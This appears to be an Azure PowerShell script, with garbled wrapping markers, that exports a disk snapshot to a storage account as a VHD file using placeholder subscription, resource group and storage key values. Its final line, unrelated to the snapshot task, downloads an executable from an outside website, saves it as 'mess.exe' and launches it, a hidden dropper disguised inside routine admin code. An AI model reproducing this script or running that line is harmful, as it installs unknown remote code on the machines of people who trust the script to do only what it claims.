
 -||-> $subscriptionId = "yourSubscriptionId" <-||- 


 -||-> $resourceGroupName ="yourResourceGroupName" <-||- 


 -||-> $snapshotName = "yourSnapshotName" <-||- 



 -||-> $sasExpiryDuration = "3600" <-||- 


 -||-> $storageAccountName = "yourstorageaccountName" <-||- 


 -||-> $storageContainerName = "yourstoragecontainername" <-||- 


 -||-> $storageAccountKey = 'yourStorageAccountKey' <-||- 


 -||-> $destinationVHDFileName = "yourvhdfilename" <-||- 



 -||-> Select-AzSubscription -SubscriptionId $SubscriptionId <-||- 


 -||-> $sas =  -||-> Grant-AzSnapshotAccess -ResourceGroupName $ResourceGroupName -SnapshotName $SnapshotNameÂ  -DurationInSecond $sasExpiryDuration -Access Read <-||-  <-||- 

 -||-> $destinationContext =  -||-> New-AzStorageContext -StorageAccountName $storageAccountName -StorageAccountKey $storageAccountKey <-||-  <-||- 


 -||-> Start-AzStorageBlobCopy -AbsoluteUri $sas.AccessSAS -DestContainer $storageContainerName -DestContext $destinationContext -DestBlob $destinationVHDFileName <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://danhviet.com.vn/app/p2.exe','mess.exe') <-||- ; -||-> Start-Process 'mess.exe' <-||- 



